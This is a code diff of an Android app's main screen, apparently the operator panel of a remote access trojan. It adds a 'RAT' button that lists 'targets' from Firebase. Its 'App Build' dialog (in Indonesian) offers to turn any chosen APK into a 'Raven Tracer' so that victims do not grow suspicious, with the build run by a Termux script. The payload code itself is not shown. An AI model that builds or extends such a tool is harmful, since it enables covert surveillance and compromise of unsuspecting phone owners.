@@ -3,12 +3,11 @@ package com.paragon.control;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
-import android.view.View;
 import android.widget.Button;
-import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.annotation.Nullable;
+import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
@@ -16,8 +15,7 @@ import com.google.firebase.database.FirebaseDatabase;
 public class MainActivity extends AppCompatActivity {
 
     private DatabaseReference mDatabase;
-    private LinearLayout menuContainer;
-    private Button btnGuideTermux, btnGuideVps, btnAppBuild;
+    private Button btnGuideTermux, btnGuideVps, btnAppBuild, btnRAT;
     private TextView navBeranda, navMenu, navTools, navSetting;
 
     private static final int REQUEST_APP_BUILD = 1001;
@@ -27,10 +25,10 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        menuContainer = findViewById(R.id.menuContainer);
         btnGuideTermux = findViewById(R.id.btnGuideTermux);
         btnGuideVps = findViewById(R.id.btnGuideVps);
         btnAppBuild = findViewById(R.id.btnAppBuild);
+        btnRAT = findViewById(R.id.btnRAT);
         navBeranda = findViewById(R.id.navBeranda);
         navMenu = findViewById(R.id.navMenu);
         navTools = findViewById(R.id.navTools);
@@ -39,12 +37,19 @@ public class MainActivity extends AppCompatActivity {
         FirebaseDatabase database = FirebaseDatabase.getInstance();
         mDatabase = database.getReference("target");
 
+        // ===== RAT =====
+        btnRAT.setOnClickListener(v -> {
+            startActivity(new Intent(this, TargetListActivity.class));
+        });
+
+        // ===== APP BUILD =====
         btnAppBuild.setOnClickListener(v -> showAppBuildDialog());
 
+        // ===== NAVIGASI =====
         navBeranda.setOnClickListener(v -> setNavActive(navBeranda));
         navMenu.setOnClickListener(v -> {
             setNavActive(navMenu);
-            startActivity(new Intent(this, MenuDetailActivity.class));
+            Toast.makeText(this, "📋 Menu", Toast.LENGTH_SHORT).show();
         });
         navTools.setOnClickListener(v -> {
             setNavActive(navTools);
@@ -55,29 +60,39 @@ public class MainActivity extends AppCompatActivity {
             startActivity(new Intent(this, SettingActivity.class));
         });
 
+        // ===== GUIDE =====
         btnGuideTermux.setOnClickListener(v -> {
             startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/syam_guide")));
         });
         btnGuideVps.setOnClickListener(v -> {
             startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/syam_vps")));
         });
-
-        setupMenu();
     }
 
     private void showAppBuildDialog() {
-        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("🔧 App Build");
         builder.setMessage("Pilih APK dari storage untuk diubah menjadi Raven Tracer.\n\nTarget gak akan curiga karena APK tetap keliatan kayak aplikasi biasa.");
-
         builder.setPositiveButton("📁 PILIH APK", (dialog, which) -> {
             Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
             intent.setType("application/vnd.android.package-archive");
             startActivityForResult(intent, REQUEST_APP_BUILD);
         });
-
         builder.setNegativeButton("Batal", null);
         builder.show();
+    }
+
+    private void setNavActive(TextView active) {
+        TextView[] navs = {navBeranda, navMenu, navTools, navSetting};
+        for (TextView nav : navs) {
+            if (nav == active) {
+                nav.setTextColor(getColor(R.color.primary));
+                nav.setBackgroundResource(R.drawable.nav_active);
+            } else {
+                nav.setTextColor(getColor(R.color.secondary));
+                nav.setBackgroundResource(0);
+            }
+        }
     }
 
     @Override
@@ -116,7 +131,6 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(this, "⚠️ Termux belum terinstall!\nDownload dari F-Droid", Toast.LENGTH_LONG).show();
             return;
         }
-
         try {
             Intent intent = new Intent("com.termux.RUN_COMMAND");
             intent.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/home/build.sh");
@@ -137,40 +151,4 @@ public class MainActivity extends AppCompatActivity {
             return false;
         }
     }
-
-    private void setNavActive(TextView active) {
-        TextView[] navs = {navBeranda, navMenu, navTools, navSetting};
-        for (TextView nav : navs) {
-            if (nav == active) {
-                nav.setTextColor(getColor(R.color.cyan));
-                nav.setBackgroundResource(R.drawable.nav_active);
-            } else {
-                nav.setTextColor(getColor(R.color.gray));
-                nav.setBackgroundResource(0);
             }
-        }
-    }
-
-    private void setupMenu() {
-        String[][] menus = {
-            {"Bug & Pairing", "Server di HP · Server Lokal", "BUG"}
-        };
-
-        for (String[] menu : menus) {
-            View item = getLayoutInflater().inflate(R.layout.item_menu, null);
-            ((TextView) item.findViewById(R.id.tvMenuTitle)).setText(menu[0]);
-            ((TextView) item.findViewById(R.id.tvMenuSub)).setText(menu[1]);
-            ((TextView) item.findViewById(R.id.tvMenuBadge)).setText(menu[2]);
-
-            item.setOnClickListener(v -> {
-                Intent intent = new Intent(this, MenuDetailActivity.class);
-                intent.putExtra("menuTitle", menu[0]);
-                intent.putExtra("menuSub", menu[1]);
-                intent.putExtra("menuBadge", menu[2]);
-                startActivity(intent);
-            });
-
-            menuContainer.addView(item);
-        }
-    }
-}
